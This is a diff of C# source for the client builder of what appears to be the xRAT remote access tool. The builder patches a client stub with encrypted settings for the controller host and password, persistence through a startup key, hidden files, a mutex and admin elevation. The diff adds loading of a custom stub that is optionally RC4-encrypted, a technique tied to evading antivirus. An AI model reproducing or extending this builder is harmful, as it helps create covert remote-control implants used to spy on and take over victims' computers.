@@ -2,6 +2,7 @@
 using Mono.Cecil;
 using Mono.Cecil.Cil;
 using System;
+using System.IO;
 using System.Windows.Forms;
 using Vestris.ResourceLib;
 using xRAT_2.Settings;
@@ -10,11 +11,24 @@ namespace Core.Build
 {
     class ClientBuilder
     {
-        public static void Build(string output, string host, string password, string installsub, string installname, string mutex, string startupkey, bool install, bool startup, bool hidefile, int port, int reconnectdelay, int installpath, bool adminelevation, string iconpath, string[] asminfo)
+        public static void Build(string output, string host, string password, string installsub, string installname, string mutex, string startupkey, bool install, bool startup, bool hidefile, int port, int reconnectdelay, int installpath, bool adminelevation, string iconpath, string version, string[] asminfo, string StubPath = "", string StubEncryptionKey = "")
         {
             // PHASE 1 - Settings
             string encKey = Helper.GetRandomName(20);
-            AssemblyDefinition asmDef = AssemblyDefinition.ReadAssembly("client.bin");
+            AssemblyDefinition asmDef;
+
+            if (!(StubPath == String.Empty) & !(StubEncryptionKey == String.Empty))
+            {
+                asmDef = AssemblyDefinition.ReadAssembly(new MemoryStream(RC4.Decrypt(File.ReadAllBytes(StubPath), StubEncryptionKey)));
+            }
+            else if (!(StubPath == String.Empty) & (StubEncryptionKey == String.Empty))
+            {
+                asmDef = AssemblyDefinition.ReadAssembly(new MemoryStream(File.ReadAllBytes(StubPath)));
+            }
+            else
+            {
+                asmDef = AssemblyDefinition.ReadAssembly("client.bin");
+            }
 
             foreach (var typeDef in asmDef.Modules[0].Types)
             {
@@ -33,7 +47,7 @@ namespace Core.Build
                                     switch (strings)
                                     {
                                         case 1: //version
-                                            methodDef.Body.Instructions[i].Operand = AES.Encrypt(Application.ProductVersion, encKey);
+                                            methodDef.Body.Instructions[i].Operand = AES.Encrypt(version, encKey);
                                             break;
                                         case 2: //ip/hostname
                                             methodDef.Body.Instructions[i].Operand = AES.Encrypt(host, encKey);
